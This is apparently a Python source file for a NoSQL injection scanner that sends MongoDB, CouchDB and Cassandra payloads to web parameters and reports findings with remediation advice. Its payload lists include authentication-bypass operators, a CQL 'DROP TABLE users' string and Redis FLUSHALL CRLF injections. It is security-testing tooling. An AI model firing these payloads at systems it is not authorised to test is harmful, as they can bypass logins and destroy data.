"""
Scanner de vulnérabilités NoSQL Injection
MongoDB, CouchDB, Cassandra, Redis, ElasticSearch
"""

import asyncio
import json
from typing import Optional, List, Dict
from loguru import logger
import aiohttp

from core.models import Vulnerabilite


class ScannerNoSQLInjection:
    """
    Détecte les vulnérabilités NoSQL Injection
    Supporte: MongoDB, CouchDB, Cassandra, Redis, ElasticSearch
    """

    def __init__(self, auth_config: Dict = None):
        """
        Initialise le scanner NoSQL Injection
        
        Args:
            auth_config: Configuration d'authentification
        """
        self.auth_config = auth_config or {}
        
        # Payloads MongoDB
        self.payloads_mongodb = [
            # Operator injection
            {"$gt": ""},           # Greater than (bypass)
            {"$ne": None},         # Not equal (bypass)
            {"$ne": ""},           # Not equal empty string
            {"$nin": [0, 1]},      # Not in
            {"$regex": ".*"},      # Regex match all
            {"$where": "1==1"},    # JavaScript injection
            
            # Authentication bypass
            {"$gt": "", "$lt": "zzz"},
            {"username": {"$ne": None}, "password": {"$ne": None}},
            
            # Array injection
            {"$in": ["admin", "user", "test"]},
            
            # Type confusion
            {"$type": "string"},
            
            # Advanced injections
            {"$exists": True},
            {"$or": [{"a": 1}, {"b": 1}]},
            {"$and": [{"a": 1}, {"b": 1}]},
            {"$not": {"a": 1}},
        ]
        
        # Payloads string-based MongoDB
        self.payloads_mongodb_string = [
            # String injections (si parsing JSON côté serveur)
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$ne": ""}',
            '{"$regex": ".*"}',
            '{"$where": "return true"}',
            
            # Array bypass
            '[$ne]=1',
            '[$gt]=',
            
            # PHP-style array injection
            'username[$ne]=test&password[$ne]=test',
        ]
        
        # Payloads CouchDB
        self.payloads_couchdb = [
            # View manipulation
            {"key": {"$gte": None}},
            {"startkey": "", "endkey": "zzz"},
            
            # MapReduce injection
            {"map": "function(doc){emit(null, doc);}"},
        ]
        
        # Payloads Cassandra CQL Injection
        self.payloads_cassandra = [
            # CQL injection (similar to SQL)
            "' OR 1=1--",
            "' OR '1'='1",
            "'; DROP TABLE users--",
            "' UNION SELECT * FROM system.peers--",
        ]
        
        # Payloads Redis
        self.payloads_redis = [
            # Command injection via EVAL
            "EVAL 'return 1' 0",
            "EVAL 'return redis.call(\"GET\", \"key\")' 0",
            
            # CRLF injection
            "\r\nFLUSHALL\r\n",
            "\r\nCONFIG GET *\r\n",
        ]
        
        # Payloads ElasticSearch
        self.payloads_elasticsearch = [
            # Query DSL injection
            {"query": {"match_all": {}}},
            {"query": {"bool": {"must": [{"match_all": {}}]}}},
            
            # Script injection
            {"script": {"source": "1+1"}},
            {"script": {"lang": "painless", "source": "return true"}},
        ]

    async def scanner(self, url: str, params: Dict = None) -> List[Vulnerabilite]:
        """
        Scanne les vulnérabilités NoSQL Injection
        
        Args:
            url: URL à tester
            params: Paramètres découverts
            
        Returns:
            List[Vulnerabilite]: Vulnérabilités NoSQL trouvées
        """
        vulnerabilites = []
        
        if not params:
            logger.debug(f"⏭️  Pas de paramètres pour NoSQL: {url}")
            return vulnerabilites
        
        logger.info(f"🔍 Test NoSQL Injection: {url}")
        
        try:
            async with aiohttp.ClientSession(
                cookies=self.auth_config.get('cookies'),
                headers=self.auth_config.get('headers')
            ) as session:
                for param_name in params.keys():
                    # Tester MongoDB
                    mongo_vulns = await self._test_mongodb_injection(
                        session, url, param_name, params
                    )
                    vulnerabilites.extend(mongo_vulns)
                    
                    # Tester CouchDB
                    couch_vulns = await self._test_couchdb_injection(
                        session, url, param_name, params
                    )
                    vulnerabilites.extend(couch_vulns)
                    
                    # Tester Cassandra
                    cassandra_vulns = await self._test_cassandra_injection(
                        session, url, param_name, params
                    )
                    vulnerabilites.extend(cassandra_vulns)
                    
                    await asyncio.sleep(0.1)
        
        except Exception as e:
            logger.debug(f"Erreur test NoSQL: {str(e)}")
        
        return vulnerabilites

    async def _test_mongodb_injection(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les injections MongoDB"""
        vulnerabilites = []
        
        # Baseline response
        baseline = await self._get_baseline(session, url, params)
        
        # Test 1: JSON payloads (POST)
        for payload in self.payloads_mongodb:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                headers = {'Content-Type': 'application/json'}
                
                async with session.post(
                    url,
                    json=test_params,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    if await self._est_vulnerable_nosql(contenu, baseline, payload):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="NoSQL_Injection_MongoDB",
                                severite="CRITIQUE",
                                url=url,
                                description=f"NoSQL Injection MongoDB via '{param_name}'. Permet de bypasser l'authentification et d'exfiltrer des données.",
                                payload=f"{param_name}={json.dumps(payload)}",
                                preuve=contenu[:400],
                                cvss_score=9.5,
                                remediation=self._get_remediation_nosql('MongoDB')
                            )
                        )
                        logger.success(f"✅ MongoDB Injection trouvé: {param_name}")
                        break
            
            except Exception as e:
                logger.debug(f"Erreur MongoDB payload: {str(e)}")
                continue
        
        # Test 2: String payloads (GET avec query params)
        for payload_str in self.payloads_mongodb_string:
            try:
                test_params = params.copy()
                test_params[param_name] = payload_str
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    if await self._est_vulnerable_nosql(contenu, baseline, payload_str):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="NoSQL_Injection_MongoDB",
                                severite="CRITIQUE",
                                url=url,
                                description=f"NoSQL Injection MongoDB (string-based) via '{param_name}'",
                                payload=f"{param_name}={payload_str}",
                                preuve=contenu[:400],
                                cvss_score=9.0,
                                remediation=self._get_remediation_nosql('MongoDB')
                            )
                        )
                        logger.success(f"✅ MongoDB String Injection trouvé: {param_name}")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _test_couchdb_injection(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les injections CouchDB"""
        vulnerabilites = []
        baseline = await self._get_baseline(session, url, params)
        
        for payload in self.payloads_couchdb:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                headers = {'Content-Type': 'application/json'}
                
                async with session.post(
                    url,
                    json=test_params,
                    headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    # Indicateurs CouchDB
                    if any(ind in contenu for ind in ['_id', '_rev', 'couchdb', 'rows']):
                        if contenu != baseline:
                            vulnerabilites.append(
                                Vulnerabilite(
                                    type="NoSQL_Injection_CouchDB",
                                    severite="HAUTE",
                                    url=url,
                                    description=f"NoSQL Injection CouchDB via '{param_name}'",
                                    payload=f"{param_name}={json.dumps(payload)}",
                                    preuve=contenu[:400],
                                    cvss_score=8.5,
                                    remediation=self._get_remediation_nosql('CouchDB')
                                )
                            )
                            logger.success(f"✅ CouchDB Injection trouvé: {param_name}")
                            break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _test_cassandra_injection(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param_name: str,
        params: Dict
    ) -> List[Vulnerabilite]:
        """Teste les injections Cassandra CQL"""
        vulnerabilites = []
        baseline = await self._get_baseline(session, url, params)
        
        for payload in self.payloads_cassandra:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                async with session.get(
                    url,
                    params=test_params,
                    timeout=aiohttp.ClientTimeout(total=10)
                ) as response:
                    contenu = await response.text()
                    
                    # Détection d'erreurs CQL ou changement de comportement
                    cql_errors = ['SyntaxException', 'InvalidRequest', 'cassandra']
                    
                    if any(err in contenu for err in cql_errors) or (len(contenu) > len(baseline) * 1.5):
                        vulnerabilites.append(
                            Vulnerabilite(
                                type="NoSQL_Injection_Cassandra",
                                severite="HAUTE",
                                url=url,
                                description=f"CQL Injection (Cassandra) via '{param_name}'",
                                payload=f"{param_name}={payload}",
                                preuve=contenu[:400],
                                cvss_score=8.0,
                                remediation=self._get_remediation_nosql('Cassandra')
                            )
                        )
                        logger.success(f"✅ Cassandra Injection trouvé: {param_name}")
                        break
            
            except Exception:
                continue
        
        return vulnerabilites

    async def _est_vulnerable_nosql(
        self, contenu: str, baseline: str, payload
    ) -> bool:
        """
        Détermine si la réponse indique une vulnérabilité NoSQL
        """
        # Critères de vulnérabilité
        # 1. Contenu très différent de baseline
        if len(contenu) > len(baseline) * 1.3:
            return True
        
        # 2. Erreurs NoSQL leak
        error_indicators = [
            'MongoError', 'MongoDB', 'CastError',
            'ValidationError', 'SyntaxError',
            '$where', '$regex', 'namespace',
            'couchdb', 'cassandra'
        ]
        if any(ind in contenu for ind in error_indicators):
            return True
        
        # 3. Authentification bypass (status code change)
        success_indicators = [
            'welcome', 'dashboard', 'admin',
            'logged in', 'token', 'session'
        ]
        if any(ind.lower() in contenu.lower() for ind in success_indicators):
            if not any(ind.lower() in baseline.lower() for ind in success_indicators):
                return True
        
        # 4. Données exposées
        if '"_id"' in contenu or '"users"' in contenu or '"data"' in contenu:
            if contenu != baseline:
                return True
        
        return False

    async def _get_baseline(
        self, session: aiohttp.ClientSession, url: str, params: Dict
    ) -> str:
        """Récupère la réponse baseline"""
        try:
            async with session.get(
                url,
                params=params,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                return await response.text()
        except Exception:
            return ""

    def _get_remediation_nosql(self, db_type: str) -> str:
        """Recommandations de remediation par base NoSQL"""
        
        base = f"""
Remediation NoSQL Injection ({db_type}):

1. Utiliser des requêtes paramétrées/préparées
2. Valider strictement le type des données
3. Sanitizer toutes les entrées utilisateur
4. Bloquer les opérateurs dangereux ($where, $regex, etc.)
5. Implémenter une whitelist de champs queryables
6. Utiliser des ORMs sécurisés avec validation
7. Principe du moindre privilège pour les comptes DB
8. Désactiver JavaScript dans MongoDB si non nécessaire
9. Rate limiting sur les endpoints API
10. Logs et monitoring des requêtes anormales

Spécifique {db_type}:
"""
        
        specifics = {
            'MongoDB': """
- Utiliser Mongoose avec validation de schéma stricte
- Désactiver mapReduce, group() et $where en production
- Ne jamais passer d'objets JSON bruts aux requêtes
- Schema validation avec JSON Schema
- Utiliser allowDiskUse: false pour limiter DoS
""",
            'CouchDB': """
- Utiliser des vues pré-définies, pas de vues dynamiques
- Validation stricte avec validate_doc_update
- Bloquer l'accès direct à /_all_docs
- Authentification forte et CORS restreint
""",
            'Cassandra': """
- Utiliser prepared statements systématiquement
- Validation CQL côté application
- Bloquer les caractères spéciaux (' ; --)
- Limiter les permissions GRANT
"""
        }
        
        return base + specifics.get(db_type, "")


# Test
async def test_nosql():
    """Test du scanner NoSQL"""
    scanner = ScannerNoSQLInjection()
    test_url = "http://localhost:3000/api/login"
    test_params = {'username': 'admin', 'password': 'pass'}
    
    vulns = await scanner.scanner(test_url, test_params)
    print(f"{'✅' if vulns else '❌'} {len(vulns)} vulnérabilités NoSQL trouvées")


if __name__ == "__main__":
    asyncio.run(test_nosql())
